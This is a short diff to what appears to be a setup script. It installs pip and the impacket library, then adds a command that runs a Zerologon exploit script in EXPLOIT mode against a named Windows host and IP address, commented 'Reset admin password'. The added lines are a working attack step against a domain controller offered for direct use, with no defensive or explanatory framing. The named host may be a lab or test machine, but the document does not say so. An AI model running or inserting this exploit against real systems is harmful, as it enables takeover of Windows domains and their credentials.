@@ -6,3 +6,6 @@ python3 get-pip.py --user
 PATH=$PATH:$HOME/.local/bin
 
 pip3 install impacket
+
+# Reset admin password
+python3 zerologon.py -do EXPLOIT -target EC2AMAZ-8SFMEJU -ip 192.168.1.2
